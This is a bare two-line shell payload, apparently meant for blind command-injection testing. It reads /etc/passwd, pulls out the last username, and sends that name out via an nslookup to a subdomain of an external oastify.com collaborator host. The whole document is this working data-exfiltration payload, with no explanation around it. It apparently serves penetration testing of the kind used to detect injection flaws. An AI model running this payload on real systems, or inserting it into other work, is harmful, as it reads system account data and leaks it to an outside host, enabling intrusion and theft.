n=$(cat /etc/passwd | cut -d ":" -f -1 | tail -1 | grep ^[a-z]);
nslookup $n.kl9dtf96irwnwq4bljh5uvm0brhi5atz.oastify.com
